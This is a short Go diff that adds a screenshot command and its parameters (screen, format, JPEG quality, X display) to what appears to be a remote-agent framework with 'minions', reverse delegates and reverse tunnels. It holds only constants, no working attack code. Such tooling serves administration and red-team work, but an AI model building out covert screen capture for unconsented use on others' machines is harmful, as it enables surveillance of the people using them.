@@ -33,6 +33,8 @@ const (
 	// opReverseDelegate makes it a delegate the other way: it listens, and
 	// carries the minions that dial it (delegate_reverse.go).
 	opReverseDelegate = 19
+	// opScreenshot takes a picture of the host's screen (screenshot.go).
+	opScreenshot = 20
 )
 
 // Params, by command.
@@ -87,6 +89,15 @@ const (
 	// reverseTunnelUDP: listen for datagrams, a stream for each address
 	// they come from.
 	reverseTunnelUDP = 5
+)
+
+// A screenshot's params: which screen (0 every one), PNG or JPEG and the
+// JPEG's quality, and on Linux the X display.
+const (
+	screenshotScreen   = 1
+	screenshotFormat   = 2
+	screenshotQuality  = 3
+	screenshotXDisplay = 4
 )
 
 // A reverse delegate's params.
